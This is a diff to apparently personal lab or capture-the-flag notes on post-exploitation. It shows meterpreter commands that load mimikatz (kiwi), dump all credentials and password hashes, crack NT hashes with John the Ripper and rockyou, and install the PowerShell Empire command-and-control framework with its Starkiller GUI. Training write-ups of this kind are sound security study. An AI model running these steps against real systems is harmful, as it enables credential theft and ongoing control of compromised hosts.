@@ -45,4 +45,28 @@ exploit
 we get a reverse meterpreter shell since we didnt change the payload. we can do a couple of things here
 ```bash
 getuid
-g
+sysinfo
+load kiwi #loads mimikatz
+creds_all #dumps creds
+hashdump  #dumps hashes
+```
+
+we can crack the password
+```bash
+john empire.hash --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+lets now use Powershell Empire as intended. we can get it from [here](https://github.com/BC-SECURITY/Empire)
+```bash
+cd /opt
+git clone https://github.com/BC-SECURITY/Empire
+cd Empire
+./setup/install.sh
+```
+
+lets also install the GUI version called [Starkiller](https://github.com/BC-SECURITY/Starkiller/releases)
+```bash
+chmod +x starkiller.AppImage
+```
+
+now lets start both Empire and Starkiller
